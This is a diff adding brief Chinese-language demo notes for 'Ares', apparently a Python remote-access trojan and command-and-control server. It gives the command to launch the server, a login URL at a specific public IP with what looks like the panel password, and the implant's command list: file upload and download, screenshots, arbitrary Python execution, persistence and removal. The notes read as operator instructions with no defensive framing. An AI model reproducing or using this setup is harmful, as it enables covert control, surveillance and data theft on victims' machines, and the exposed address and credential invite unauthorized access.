@@ -1,0 +1,36 @@
+演示：
+
+[1]Ares服务端
+
+1 运行
+nohup python ares.py runserver -h 0.0.0.0 -p 8080 2>&1 &
+
+2 地址
+http://103.242.2.28:8080/login
+
+admin123###
+
+3 命令
+upload <local_file>
+Uploads <local_file> to server.
+
+download <url> <destination>
+Downloads a file through HTTP(S).
+
+zip <archive_name> <folder>
+Creates a zip archive of the folder.
+
+screenshot
+Takes a screenshot.
+
+python <command|file>
+Runs a Python command or local file.
+
+persist
+Installs the agent.
+
+clean
+Uninstalls the agent.
+
+exit
+Kills the agent.
